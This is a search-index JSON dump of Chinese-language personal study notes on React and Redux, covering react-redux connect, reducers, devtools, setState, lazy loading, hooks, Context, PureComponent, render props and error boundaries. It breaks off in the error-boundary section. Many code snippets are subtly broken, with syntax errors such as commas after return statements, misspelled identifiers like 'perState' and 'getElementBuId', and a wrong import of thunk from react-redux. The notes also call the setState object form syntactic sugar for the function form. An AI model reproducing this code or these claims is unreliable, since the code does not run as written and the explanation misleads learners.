'react-redux';\n\nReactDOM.render(\n    &lt;Provider store={store}&gt;&lt;App/&gt;&lt;/Provider&gt;,\n  document.getElementById('root')\n);\n</code></pre> <p>\u5b50\u7ec4\u4ef6</p> <pre><code>import { createIncrementAction, createDeleteAction, } from '../../redux/count_action';\n\nexport default connect(\n    state =&gt; ({ count: state }),\n  dispatch =&gt; (\n    add: createIncrementAction,\n    del: createDeleteAction,\n  ),\n)(CountUI);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#108-3-ui","title":"108 \u4f18\u53163-\u6574\u5408UI\u7ec4\u4ef6\u4e0e\u5bb9\u5668\u7ec4\u4ef6","text":"<ol> <li>\u56e0\u4e3a\u5bb9\u5668\u7ec4\u4ef6\u4ee3\u7801\u6bd4\u8f83\u5c11\uff0c\u628a\u5bb9\u5668\u7ec4\u4ef6\u548c UI \u7ec4\u4ef6\u7ec4\u5408\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d</li> <li>\u4e0d\u9700\u8981\u7ed9\u5bb9\u5668\u4f20\u9012 props\uff0c\u7ed9 APP \u5305\u88f9\u4e00\u4e2a Provider store={store} \u5373\u53ef</li> <li>\u4f7f\u7528 react-redux \u4e0d\u9700\u8981\u81ea\u5df1\u68c0\u6d4b redux \u7684\u72b6\u6001\u53d8\u5316\uff0c\u5bb9\u5668\u7ec4\u4ef6\u81ea\u52a8\u5b8c\u6210</li> <li>mapDispatchToProps \u7b80\u5199\u6210\u4e00\u4e2a\u5bf9\u8c61</li> <li>connect \u628a UI \u7ec4\u4ef6\u5305\u88f9\u8d77\u6765 export default connext(mapStateToProps, mapDispatchToProps)(UI \u7ec4\u4ef6)\uff0c UI \u7ec4\u4ef6\u901a\u8fc7 props \u83b7\u53d6\u72b6\u6001</li> </ol> <pre><code>import { connect } from 'react-redux';\n\nclass Count extends Component {\n  render() {\n    return (\n        &lt;span onClick={() =&gt; {this.props.add(1)}}&gt;{this.props.value}&lt;/span&gt;\n    );\n  }\n}\n\nexport default connect(\n    state =&gt; ({ value: state }),\n  {add: createAddAction},\n)(Count);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#109-person","title":"109 \u6570\u636e\u5171\u4eab-\u7f16\u5199Person\u7ec4\u4ef6","text":"<p>store \u51fd\u6570</p> <pre><code>// \u8fd9\u4e2a\u6587\u4ef6\u66b4\u9732\u4e00\u4e2a store \u5bf9\u8c61\uff08\u6574\u4e2a\u5e94\u7528\u4e00\u4e2a store \u5373\u53ef\uff09\nimport { createStore, applyMiddleware } from 'redux';\nimport counterReducer from './reducer/count';\nimport thunk from 'redux-thunk';\n\nexport default createStore(countReducer, applyMiddleware(thunk));\n</code></pre> <p>UI \u7ec4\u4ef6</p> <pre><code>export default class Person extends React.Component {\n\n  add = () =&gt; {\n    this.props.add(1);\n  }\n\n  render() {\n    return (\n      &lt;&gt;\n            &lt;span onClick={this.add}&gt;&lt;/span&gt;\n            &lt;/&gt;\n    );\n  }\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#110-personreducer","title":"110 \u6570\u636e\u5171\u4eab-\u7f16\u5199Person\u7ec4\u4ef6\u7684reducer","text":"<p>reducer </p> <pre><code>import { ADD } from '../constant';\n\nconst initState = [\n  {id: '012', name: 'Tom', age: 20},\n];\n\nexport default function personReducer(preState = initState, action) {\n  const { type, data } = action;\n  switch (type) {\n    case ADD:\n      return [data, ...perState],\n    default:\n      return preState;  \n  }\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#111-","title":"111 \u6570\u636e\u5171\u4eab-\u5b8c\u6210\u6570\u636e\u5171\u4eab","text":"<ol> <li>\u5b9a\u4e49Person\u7ec4\u4ef6\uff0c\u548c Count \u901a\u8fc7 redux \u5171\u4eab\u6570\u636e</li> <li>\u4e3a Person \u7ec4\u4ef6\u7f16\u5199\uff0creducer, action,</li> <li>PersonReducer \u548c countReducer \u9700\u8981\u5408\u5e76 combineReducer \u6210\u4e00\u4e2a\u5bf9\u8c61</li> <li>\u628a\u5408\u5e76\u540e\u7684 reducer \u4ea4\u7ed9 store\uff0c\u6700\u540e\u5728 UI \u7ec4\u4ef6\u4e2d\u53d6\u51fa\u72b6\u6001</li> </ol>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#112","title":"112 \u7eaf\u51fd\u6570","text":"<p>reducer \u662f\u4e00\u4e2a\u7eaf\u51fd\u6570\uff08\u4e0d\u4f1a\u6539\u53d8\u5df2\u6709\u72b6\u6001\uff0c\u4f1a\u751f\u6210\u65b0\u7684\u5bf9\u8c61 \u2014\u2014\u4e0d\u4f7f\u7528 splice \u4f7f\u7528 [date, ...preState] \u8fd9\u6837\u7684\u8bed\u6cd5\u751f\u6210\u65b0\u7684\u6570\u7ec4\uff09</p> <p>\u7eaf\u51fd\u6570\uff08reducer\uff09\uff1a\u540c\u6837\u7684\u53c2\u6570\uff0c\u90a3\u4e48\u51fd\u6570\u8fd4\u56de\u503c\u76f8\u540c\u3002\u4e0d\u80fd\u6539\u53d8\u53c2\u6570\u6570\u636e\uff0c\u4e0d\u80fd\u4ea7\u751f\u526f\u4f5c\u7528\uff08\u7f51\u7edc\u8bf7\u6c42\uff0c\u8f93\u5165\u8f93\u51fa\uff09\uff0c\u4e0d\u80fd\u8c03\u7528\u968f\u673a\u51fd\u6570\uff08\u968f\u673a\u6570\uff0c\u968f\u673a\u65f6\u95f4\u6233\uff09</p> <p>\u9ad8\u9636\u51fd\u6570\uff08connect\uff09\uff1a\u53c2\u6570\u6216\u8005\u8fd4\u56de\u503c\u662f\u51fd\u6570</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#113-redux","title":"113 redux\u5f00\u53d1\u8005\u5de5\u5177","text":"<p>\u6d4f\u89c8\u5668\u63d2\u4ef6\uff1aredux dev tools\uff0c\u5728\u4ee3\u7801\u4e2d\u9700\u8981\u52a0\u5165</p> <pre><code>import { createStore, applyMiddleware, combineReducer } from 'redux';\nimport countReducer from './reducers/count';\nimport personReducer from './resucer/person';\nimport thunk from 'react-redux';\nimport { composeWithDevTools } from 'redux-devtools-extension';\n\nconst allReducer = combineReducers({\n  sum: countReducer,\n  peopleLen: personReducer,\n});\n\nexport default createStore(allReducer, composeWithDevTools(applyMiddleware(thunk)));\n</code></pre> <p>\u91cd\u542f\u9879\u76ee\uff0c\u6253\u5f00\u63a7\u5236\u53f0\uff0c\u53ef\u4ee5\u770b\u5230 redux \u8c03\u8bd5\u9762\u677f</p> <p>\u53ef\u4ee5\u770b\u5230 state \u53d8\u5316\uff0cactions \u5e8f\u5217\uff0c\u65b9\u4fbf\u76f4\u63a5\u6267\u884c action \u6216\u8005\u56de\u9000\u5230\u67d0\u4e2a action</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#114","title":"114 \u6700\u7ec8\u7248","text":"<p>index.js \u5165\u53e3\u7ec4\u4ef6</p> <pre><code>import React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\nimport store from './redux/store';\nimport {Provider} from 'react-redux';\n\n// \u4f7f\u7528 Provider \u5305\u88f9\u9876\u5c42\u7ec4\u4ef6\uff0c\u8ba9\u6240\u6709\u540e\u4ee3\u5bb9\u5668\u7ec4\u4ef6\u80fd\u63a5\u6536\u5230 store\nReactDOM.render(\n    &lt;Provider store={store}&gt;\n    &lt;App/&gt;\n  &lt;/Provider&gt;,\n    document.getElementBuId('root')\n);\n</code></pre> <p>/redux/reducers/count.js \u521b\u5efa\u4e3a Count \u670d\u52a1\u7684 reducer \u7eaf\u51fd\u6570</p> <pre><code>import {ADD, DEL} from '../constant';\n\nconst initState = 0;\n\nexport default function countReducer(preState = initState, action) {\n  const {type, action} = action;\n  switch (type) {\n    case ADD:\n      return preState + data,  \n    case DEL:\n      return preState - data,\n    default:\n        return preState,\n  }\n}\n</code></pre> <p>/redux/reducers/person.js</p> <pre><code>import {ADD_PERSON} from '../constant';\n\nconst initState = [\n  {\n    id: '01',\n    name: 'Amber',\n    age: 18\n  },\n  {\n    id: '02',\n    name: 'Noella',\n    age: 14\n  }\n];\n\nexport default function personReducer(preState = initState, action) {\n  const { type, data } = action;\n  switch (type) {\n    case ADD_PERSON:\n      return [data, ...preState],  \n    default:\n        return preState,\n  }\n}\n</code></pre> <p>redux/reducer.js \u7528\u4e8e\u6c47\u603b\u6240\u6709 reducer \u5230\u4e00\u4e2a\u603b\u5bf9\u8c61</p> <pre><code>import { combineReducers } from 'redux';\nimport countReducer from './reducers/count';\nimport personReducer from './reducers/person';\n\nexport default combineReducers({\n  count: countReducer,\n  persons: personReducer,\n});\n</code></pre> <p>redux/actions/count.js \u4e3a Count \u7ec4\u4ef6\u751f\u6210 action \u5bf9\u8c61</p> <pre><code>import { ADD, DEL } from '../constant';\n\n// \u540c\u6b65 action\uff0caction \u662f object\nexport const increment = data =&gt; ({ type: ADD, data });\nexport const decrement = data =&gt; ({ type: DEL, data });\n\n// \u5f02\u6b65 action, action \u662f function\nexport const incrementAsync = (data, time) =&gt; {\n  return (dispatch) =&gt; {\n    setTimeout(() =&gt; {\n      dispatch(increment(data))\n    }, time)\n  }\n}\n</code></pre> <p>containers/Person.js</p> <pre><code>class Person extends Component {\n\n}\n\nexport default connect(\n  // \u6620\u5c04\u72b6\u6001\n    state =&gt; ({\n    persons: state.persons,\n    count: state.count,\n  }),\n  // \u6620\u5c04\u64cd\u4f5c\u72b6\u6001\u7684\u65b9\u6cd5\n  {\n    add: createAddPersonAction,\n  }\n)(Person)\n</code></pre> <p>containers/count.js</p> <pre><code>import {\n  increment,\n  decrement,\n  incrementAsync,\n} from '../../redux/actions/count';\nimport { connect } from 'react-redux';\n\nclass Count extends Component {\n\n}\n\nexport default connect(\n  // \u6620\u5c04\u72b6\u6001\n    state =&gt; ({\n    count: state.count,\n    personCount: state.persons.length,\n  }),\n  // \u6620\u5c04\u64cd\u4f5c\u72b6\u6001\u7684\u65b9\u6cd5\n  {\n    increment,\n    decrement,\n    incrementAsync,\n  }\n)(Count)\n</code></pre> <p>app.js</p> <pre><code>import { Count, Person } from './containers/';\n\nexport default class App extends Component {\n  render() {\n    return (\n        &lt;&gt;\n        &lt;Count/&gt;\n        &lt;Person/&gt;\n      &lt;/&gt;\n    );\n  }\n}\n</code></pre> <p>redux/store.js</p> <pre><code>// \u521b\u5efa\u6838\u5fc3 store \u5bf9\u8c61 \nimport { createStore, applyMiddleware } from 'redux';\nimport reducer from './reducers';\nimport thunk from 'redux-thunk';\nimport {composeWithDevTools} from 'redux-devtools-extension';\n\nexport default createStore(reducer, composeWithDevTools(applyMiddleware(thunk)));\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#115","title":"115 \u672c\u5730\u6253\u5305\u6d4b\u8bd5","text":"<pre><code>npm install serve -G\nserve -s build\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#_1","title":"\u7b2c\u516b\u7ae0 \u6269\u5c55","text":""},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#116-setstate","title":"116 setState \u7684\u53c2\u6570","text":"<p>setState \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5fc5\u9009\u7684\uff0c\u53ef\u4ee5\u662f\u5bf9\u8c61\u6216\u8005\u51fd\u6570\uff08\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff09\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u72b6\u6001\u66f4\u65b0\u540e\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>this.setState({\n  num: 1\n}, callback);\n\nthis.setState((state, props) =&gt; {\n  return {\n    num: state + this.props.num,\n  };\n}, callback);\n\n// \u8fd9\u4e24\u79cd\u5199\u6cd5\u6548\u679c\u4e00\u6837\nthis.setState({ num: this.state.num + this.props.num });\n</code></pre> <p>\u4e24\u4e2a\u5199\u6cd5\u7684\u6548\u679c\u4e00\u81f4\uff0c\u5bf9\u8c61\u662f\u51fd\u6570\u7684\u8bed\u6cd5\u7cd6\uff08\u7b80\u5199\uff09\u3002</p> <p>\u4f7f\u7528\u539f\u5219\uff1a\u5982\u679c\u65b0\u72b6\u6001\u4e0d\u4f9d\u8d56\u539f\u59cb\u7684 state \u548c props\uff0c\u4f18\u5148\u4f7f\u7528\u5bf9\u8c61\u3002\u5982\u679c\u65b0\u72b6\u6001\u4f9d\u8d56\u539f\u59cb\u7684\u72b6\u6001\uff0c\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570\u3002</p> <p>\u4e2a\u4eba\u60f3\u6cd5\uff1a\u4f18\u5148\u4f7f\u7528\u5bf9\u8c61\uff08\u7b80\u5355\u53ef\u8bfb\uff09\uff1b\u5982\u679c\u5176\u4ed6\u540c\u4e8b\u4f7f\u7528\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u4e5f\u5e94\u8be5\u719f\u6089\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#117-lazyload-suspense","title":"117 lazyload \u548c suspense","text":"<p>\u95ee\u9898\uff1a\u5982\u679c\u754c\u9762\u4e2d\u7ec4\u4ef6\u5f88\u591a\uff0c\u9996\u6b21\u52a0\u8f7d\u592a\u6d88\u8017\u6027\u80fd\uff0c\u90a3\u4e48\u53ef\u4ee5\u9996\u6b21\u52a0\u8f7d\u4e00\u90e8\u5206\u7ec4\u4ef6\uff0c\u540e\u7eed\u7ec4\u4ef6\u61d2\u52a0\u8f7d\u3002</p> <p>\u4f8b\u5982\uff1a\u4e00\u4e2a\u7ec4\u4ef6\u4e2d\u670920\u4e2a\u8def\u7531\uff0c\u7528\u6237\u53ef\u80fd\u53ea\u770b5\u4e2a\uff0c\u90a3\u4e48\u4e0d\u9700\u8981\u9996\u6b21\u52a0\u8f7d\u5168\u90e8\u7684\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u53ea\u52a0\u8f7d5\u4e2a\uff0c\u7528\u6237\u70b9\u51fb\u5176\u4ed6\u7ec4\u4ef6\uff0c\u901a\u8fc7\u7f51\u7edc\u8bf7\u6c42\u518d\u52a0\u8f7d\u5176\u4ed6\u7684\u7ec4\u4ef6\u3002</p> <pre><code>import { React, lazy, Suspense } from 'react';\nimport { NavLink, Route } from 'react-router-dom';\nimport Loading from './loading';\n\n// \u628a\u9700\u8981\u61d2\u52a0\u8f7d\u7684\u7ec4\u4ef6\uff0c\u4f7f\u7528 lazy \u51fd\u6570\u5305\u88f9\uff08\u53c2\u6570\u662f\u51fd\u6570\uff0c\u8fd4\u56de\u503c\u662f\u7ec4\u4ef6\uff09\nconst Login = lazy(() =&gt; import('./Login'));\nconst Forget = lazy(() =&gt; import('./Forget'));\nconst Main = lazy(() =&gt; import('./Main'));\n\nrender() {\n  // \u9700\u8981\u61d2\u52a0\u8f7d\u7684\u7ec4\u4ef6\uff0c\u4f7f\u7528 Suspense \u5305\u88f9\u4e00\u5c42\uff0c\u8bbe\u7f6e fallback \u4e3a\u52a0\u8f7d\u4e2d\u7684\u52a8\u753b\u6548\u679c\n  return (\n    &lt;Suspense fallback={&lt;Loading/&gt;}&gt;\n      &lt;Route path=\"/login\" component={Login}/&gt;\n      &lt;Route path=\"/forget\" component={Forget}/&gt;\n      &lt;Route path=\"/main\" component={Main}/&gt;\n    &lt;/Suspense&gt;\n  );\n}\n</code></pre> <p>\u4e2a\u4eba\u60f3\u6cd5\uff1a\u5982\u679c\u5168\u90e8\u4f7f\u7528\u61d2\u52a0\u8f7d\uff0c\u90a3\u4e48\u6700\u540e webpack \u6253\u5305\u7ed3\u679c\u662f\u5426\u6709\u5f88\u591a\u6587\u4ef6\uff0c\u662f\u5426\u4fbf\u4e8e\u7ef4\u62a4\uff1f\u5982\u679c\u591a\u9879\u76ee\u534f\u540c\u5f00\u53d1\uff0c\u662f\u5426\u5408\u9002\uff1f</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#118-hook","title":"118 hook \u6982\u8ff0","text":"<p>hook \u53ef\u4ee5\u5728\u51fd\u6570\u7ec4\u4ef6\u4e2d\u4f7f\u7528\u7c7b\u7ec4\u4ef6\u7684API\uff0c\u4f46\u662f\u6709\u5c40\u9650</p> <p>\u5e38\u7528 hook</p> <pre><code>React.useState();\nReact.useEffect();\nReact.useRef();\n</code></pre> <p>state hook: \u8ba9\u51fd\u6570\u7ec4\u4ef6\u6709 state\uff0c\u5e76\u53ef\u4ee5\u64cd\u4f5c\u66f4\u65b0 state\u3002\u53c2\u6570\u662f state \u7684\u521d\u59cb\u503c\u3002</p> <pre><code>const [ name, setName ] = React.useState('Mike');\nconst [ age, setAge ] = React.useState(0);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#119-effecthook","title":"119 EffectHook","text":"<p>Effect hook\uff1a\u8ba9\u51fd\u6570\u7ec4\u4ef6\u6709\u751f\u547d\u5468\u671f\u51fd\u6570\uff0c\u662f\u4e09\u4e2a\u751f\u547d\u5468\u671f\u51fd\u6570\u7684\u7ec4\u5408\uff08componentDidMout, ComponentDidUpdate, ComponentWillUNmount\uff09</p> <pre><code>const [ count, setCount ] = React.useState(0);\n\nuseEffect(() =&gt; {\n  // componentDidMount\n  let timer = setTimeOut(() =&gt; {\n    setCount(count =&gt; count + 1);\n  });\n  return =&gt; {\n    // componentWillUnmount\n    clearTimeout(timer);\n  }\n}, []); // \u5982\u679c\u662f\u7a7a\u6570\u7ec4\uff0c\u8868\u793a DidMount\uff0c\u5982\u679c\u6709\u6570\u636e\uff0c\u8868\u793a DidMount + DidUpdate\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#120-ref-hook","title":"120 REF hook","text":"<p>\u53ef\u4ee5\u5728\u51fd\u6570\u7ec4\u4ef6\u4e2d\u83b7\u53d6 DOM</p> <pre><code>const refDom = useRef();\n\nreturn (\n    &lt;div ref={refDom}&gt;&lt;/div&gt;\n);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#121-6-fragment","title":"121 \u6269\u5c556-Fragment","text":"<p>Fragment \u53ea\u6709\u4e24\u4e2a\u5c5e\u6027\uff0ckey \u548c children\u3002\u5176\u4ed6\u5c5e\u6027\u4e0d\u80fd\u52a0\u3002\u5982\u679c\u6ca1\u6709 key \u53ef\u4ee5\u76f4\u63a5\u53bb\u6389Fragment\uff0c\u5199\u4e00\u5bf9\u5c16\u62ec\u53f7\u5373\u53ef\u3002react \u4e0d\u4f1a\u6e32\u67d3\u4efb\u4f55\u8282\u70b9\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#122-7-context","title":"122 \u6269\u5c557-Context \u4e0a\u4e0b\u6587","text":"<p>context \u4e3b\u8981\u7528\u4e8e\u591a\u7ea7\u7ec4\u4ef6\u4f20\u53d8\u91cf\uff08\u4f8b\u5982\u5168\u5c40\u7684\u53d8\u91cf\uff09\u6bd4\u9010\u5c42\u4f20\u9012 Props \u66f4\u5bb9\u6613</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5f53\u524d\u9879\u76ee\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u5f62\u5f0f\u4f20\u53c2\uff0c\u6ca1\u6709\u76f4\u63a5\u4f7f\u7528 context \u4f20\u53c2\uff08\u5c01\u88c5\u7ec4\u4ef6\u4f7f\u7528 context\uff09</p> <p>\u4e00\u4e2a\u7ec4\u4ef6\u4e2d\uff0c\u9ed8\u8ba4\u6709 props, refs, state, context \u8fd9\u4e9b\u5c5e\u6027 </p> <pre><code>const testContext = React.createContext();\nconst lang = 'en';\n\n// \u6839\u7ec4\u4ef6\u4e2d\n&lt;testContext.Provider value={lang}&gt;\n  &lt;Children/&gt;\n&lt;/testContext.Provider&gt;\n\n// \u5b50\u7ec4\u4ef6\u4e2d\nstatic contextType = testContext;\nconsole.log(this.context);\n\n// \u5b50\u7ec4\u4ef6\u65f6\u51fd\u6570\u7ec4\u4ef6\u65f6\n&lt;testContext.Consumer&gt;\n    {value =&gt; (\n    &lt;span&gt;{value}&lt;/span&gt;\n   )\n  }  \n&lt;testContext.Consumer/&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#123-8-purecomponent","title":"123 \u6269\u5c558-PureComponent","text":"<p>Component \u7684\u6027\u80fd\u95ee\u9898\uff1a\u53ea\u8981 setState \u6267\u884c\uff0c\u5373\u4f7f\u4e0d\u6539\u53d8\u72b6\u6001\u6570\u636e\uff0c\u7ec4\u4ef6\u4e5f\u4f1a\u91cd\u65b0\u6e32\u67d3\u3002\u5982\u679c\u5f53\u524d\u7ec4\u4ef6\u6e32\u67d3\uff0c\u90a3\u4e48\u4f1a\u81ea\u52a8\u91cd\u65b0\u6e32\u67d3\u5b50\u7ec4\u4ef6\uff08\u6548\u7387\u8f83\u4f4e\uff09\u3002shouldComponentUpdate \u9ed8\u8ba4\u8fd4\u56de true\uff0c\u6240\u4ee5\u7ec4\u4ef6\u4f1a\u91cd\u65b0\u6e32\u67d3\u3002</p> <p>\u89e3\u51b3\u601d\u8def\uff1a\u5f53 props \u6216\u8005 state \u53d8\u5316\u65f6\uff0c\u624d\u91cd\u65b0\u6e32\u67d3</p> <p>\u89e3\u51b3\u65b9\u6cd5</p> <p>1\u3001\u7b80\u5355\u7ec4\u4ef6\uff08props \u548c state \u662f\u7b80\u5355\u6570\u636e\u7c7b\u578b\uff09\uff0c\u76f4\u63a5\u4f7f\u7528 PureComponent \uff0c\u5728\u7ec4\u4ef6 state \u6216\u8005 props \u4e2d\u53d8\u5316\u540e\u624d\u91cd\u65b0\u66f4\u65b0\u7ec4\u4ef6\u3002\u6ce8\u610f\uff1a\u5982\u679c props \u662f\u5bf9\u8c61\uff0c\u8fd9\u91cc\u5b9e\u73b0\u6d45\u5bf9\u6bd4\u5224\u65ad\u662f\u5426\u6e32\u67d3\u3002\u5982\u679c\u5bf9\u8c61\u5f15\u7528\u6ca1\u53d8\u5316\uff0c\u53ea\u6539\u53d8\u4e86\u503c\uff0c\u53ef\u80fd\u4e0d\u4f1a\u5f15\u8d77\u7ec4\u4ef6\u91cd\u65b0\u6e32\u67d3\u3002</p> <p>2\u3001\u590d\u6742\u7ec4\u4ef6\uff08props \u53ef\u80fd\u662f\u590d\u6742\u6570\u636e\u7c7b\u578b\uff09\u9700\u8981\u5728 shouldComponentUpdate \u4e2d\uff0c\u5224\u65ad\u6bcf\u4e00\u4e2a\u53d8\u91cf\uff0c\u7136\u540e\u5224\u65ad\u7ec4\u4ef6\u662f\u5426\u66f4\u65b0\u3002</p> <pre><code>shouldComponentUpdate(nextProps, nextState) {\n  console.log(this.state, nextState);\n  console.log(this.props, nextProps);\n}\n</code></pre> <p>\u5728 setState \u9636\u6bb5\uff0c\u6700\u597d\u76f4\u63a5\u66f4\u6539\u5bf9\u8c61\uff0c\u907f\u514d\u53ea\u66f4\u6539\u5f15\u7528</p> <pre><code>// standard\nthis.setState({ name: 10 });\n\n// bad\nlet state = this.state;\nstate.name = 10;\nthis.setState(state);\n</code></pre> <p>\u5982\u679c state \u4e2d\u662f\u6570\u7ec4\uff0c\u6700\u597d\u5b9e\u73b0\u6df1\u590d\u5236\uff0c\u907f\u514d push \u64cd\u4f5c</p> <pre><code>state = {\n  list: [1, 2, 3],\n};\n\n// bad\nlet list = this.state.list;\nlist.push(4);\nthis.setState(list); // \u8fd9\u6837 list \u6307\u9488\u6ca1\u6709\u53d8\u5316\uff0cpureComponent \u53ef\u80fd\u51fa\u9519\n\n// good\nlet list = this.state.list;\nthis.setState({ list: [...list, 4] });\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#124-renderprops","title":"124 renderProps","text":"<p>\u8fd9\u91cc\u6307\u7684\u662f\u5b50\u7ec4\u4ef6\u76f4\u63a5\u6e32\u67d3\u7236\u7ec4\u4ef6\u4f20\u9012\u7684 children\uff0c\u4e3b\u8981\u7528\u4e8e UI \u7ec4\u4ef6\u5957\u4e00\u5c42\u6837\u5f0f\uff08\u4f8b\u5982\u5bf9\u8bdd\u6846\u548c\u79fb\u52a8\u7aef\u7b49\uff09\u4e0d\u9002\u5e94\u4e8e\u5e95\u5c42\u529f\u80fd\u7ec4\u4ef6\uff0c\u8fd9\u6837\u53ef\u4ee5\u5927\u5927\u51cf\u5c11\u4ee3\u7801\u91cf\uff0c\u540c\u65f6\u786e\u4fdd\u591a\u4e2a\u7ec4\u4ef6\u7684\u6837\u5f0f\u548c\u4ea4\u4e92\u4e00\u81f4\u6027</p> <p>\u5b9e\u9645\u4e0a\u9879\u76ee\u4e2d\u4f7f\u7528\u7684\u4e0d\u591a\uff0c\u4e5f\u9020\u6210\u4e86\u4e0d\u540c\u7ec4\u4ef6\u4ee3\u7801\u91cd\u590d\u7387\u5f88\u9ad8\uff0c\u800c\u4e14\u6837\u5f0f\u4e0d\u4e00\u81f4\u7684\u95ee\u9898</p> <pre><code>class A extends Component {\n  render() {\n    return (\n        &lt;div className=\"parent\"&gt;\n        &lt;B render={(name) =&gt; &lt;C name={name} /&gt;}&gt;\n      &lt;/div&gt;\n    );\n  }\n}\n\nclass B extends Component {\n  state = {name: 'tom'};\n  render() {\n    // \u8fd9\u91cc\u6e32\u67d3\u4e86\u7236\u7ec4\u4ef6\u7684 props,\u5e76\u4e14\u4f20\u53c2\u4e86 name\n    return(\n        &lt;div&gt;\n        {this.props.render(this.state.name)}\n      &lt;/div&gt;\n    );\n  }\n}\n\nclass C extends Component {\n  render() {\n    return (\n        &lt;div&gt;{this.props.name}&lt;/div&gt;\n    );\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u6848\u4f8b\uff0c\u5b9e\u9645\u4f7f\u7528\u4e0d\u591a\uff0c\u6bd5\u7adf\u8fd9\u6837\u4e0d\u597d\u7ef4\u62a4</p> <p>children props \u901a\u8fc7\u7ec4\u4ef6\u6807\u7b7e\u4f53\u4f20\u5165\u7ed3\u6784</p> <p>render props \u901a\u8fc7\u5c5e\u6027\u6807\u7b7e\u4f20\u5165\u7ed3\u6784\uff08\u901a\u5e38\u662frender\uff09</p> <p>\uff08\u5728 VUE \u4e2d\u8fd9\u662f slot \u63d2\u69fd\u6280\u672f\uff09</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#125","title":"125 \u9519\u8bef\u8fb9\u754c","text":"<p>\u53ef\u4ee5\u6355\u83b7\u540e\u4ee3\u7ec4\u4ef6\u4e2d\u6e32\u67d3\u51fa\u73b0\u7684\u9519\u8bef\uff0c\u5e76\u6e32\u67d3\u51fa\u5907\u7528\u754c\u9762</p> <ul> <li> <p>\u540e\u4ee3\u7ec4\u4ef6\uff0c\u4e0d\u5305\u62ec\u5f53\u524d\u7ec4\u4ef6</p> </li> <li> 